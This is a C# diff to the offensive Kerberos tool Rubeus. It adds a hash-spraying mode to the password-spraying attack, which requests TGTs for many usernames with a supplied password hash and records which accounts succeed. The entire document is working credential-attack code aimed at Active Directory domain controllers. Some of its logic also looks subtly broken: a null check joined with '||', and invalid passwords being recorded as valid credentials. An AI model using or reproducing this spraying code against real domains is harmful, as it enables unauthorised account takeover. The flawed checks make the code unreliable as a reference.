@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using Rubeus.Commands;
 
 namespace Rubeus
 {
@@ -11,6 +12,7 @@ namespace Rubeus
         void ReportInvalidUser(string domain, string username);
         void ReportBlockedUser(string domain, string username);
         void ReportKrbError(string domain, string username, KRB_ERROR krbError);
+        void ReportInvalidPassword(string domain, string username, string password, string hash);
     }
 
 
@@ -34,30 +36,42 @@ namespace Rubeus
             this.validCredentials = new Dictionary<string, string>();
         }
 
-        public bool Attack(string[] usernames, string[] passwords)
+        public bool Attack(string[] usernames, string[] passwords, string hash, bool hashspray, Interop.KERB_ETYPE enctype)
         {
             bool success = false;
-            foreach (string password in passwords)
+            if (hashspray)
             {
                 foreach (string username in usernames)
                 {
-                    if(this.TestUsernamePassword(username, password))
+                    if (this.TestUsernamePassword(username, "", hash, hashspray, enctype))
                     {
                         success = true;
                     }
                 }
             }
-
+            else
+            {
+                foreach (string password in passwords)
+                {
+                    foreach (string username in usernames)
+                    {
+                        if (this.TestUsernamePassword(username, password, hash, hashspray, enctype))
+                        {
+                            success = true;
+                        }
+                    }
+                }
+            }
             return success;
         }
 
-        private bool TestUsernamePassword(string username, string password)
+        private bool TestUsernamePassword(string username, string password, string hash, bool hashspray, Interop.KERB_ETYPE enctype)
         {
             try
             {
                 if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                 {
-                    this.GetUsernamePasswordTGT(username, password);
+                    this.GetUsernamePasswordTGT(username, password, hash, hashspray, enctype);
                     return true;
                 }
             }
@@ -69,29 +83,62 @@ namespace Rubeus
             return false;
         }
 
-        private void GetUsernamePasswordTGT(string username, string password)
+        private void GetUsernamePasswordTGT(string username, string password, string pwhash, bool hashspray, Interop.KERB_ETYPE etype)
         {
-            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-            string salt = String.Format("{0}{1}", domain.ToUpper(), username);
-
-            // special case for computer account salts
-            if (username.EndsWith("$"))
+            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.rc4_hmac;
+            string hash = "";
+            if (hashspray)
             {
-                salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
+                encType = etype;
+                hash = pwhash;
+            }
+            else
+            {
+                string salt = String.Format("{0}{1}", domain.ToUpper(), username);
+                // special case for computer account salts
+                if (username.EndsWith("$"))
+                {
+                    salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
+                }
+
+                hash = Crypto.KerberosPasswordHash(encType, password, salt);
             }
 
-            string hash = Crypto.KerberosPasswordHash(encType, password, salt);
+            try
+            {
+                AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);
 
-            AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);
+                byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
+                if (TGT != null || TGT.Length == 0)
+                {
+                    password = hash;
+                    this.ReportValidPassword(username, password, TGT);
+                }
+            }
+            catch (KerberosErrorException kex)
+            {
+                KRB_ERROR error = kex.krbError;
 
-            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
+                //Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
+                // KDC_ERR_PREAUTH_FAILED = incorrect password, Assumed all usernames are correct and preauth enabled.
+                if (error.error_code == 24)
+                {
+                    this.ReportInvalidPassword(username, password, hash);
+                }
 
-            this.ReportValidPassword(username, password, TGT);
+                if (error.e_data[0].type == Interop.PADATA_TYPE.SUPERSEDED_BY_USER)
+                {
+                    PA_SUPERSEDED_BY_USER obj = (PA_SUPERSEDED_BY_USER)error.e_data[0].value;
+                    Console.WriteLine("[*] {0} is superseded by {1}", username, obj.name.name_string[0]);
+                }
+
+
+            }
         }
 
         private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
         {
-            
+
 
             KRB_ERROR krbError = ex.krbError;
             bool ret = false;
@@ -171,6 +218,17 @@ namespace Rubeus
         private void ReportKrbError(string username, KRB_ERROR krbError)
         {
             this.reporter.ReportKrbError(this.domain, username, krbError);
+        }
+
+        private void ReportInvalidPassword(string username, string password, string hash)
+        {
+
+            validCredentials.Add(username, password);
+            if (!validUsers.ContainsKey(username))
+            {
+                validUsers.Add(username, true);
+            }
+            this.reporter.ReportInvalidPassword(this.domain, username, password, hash);
         }
 
     }
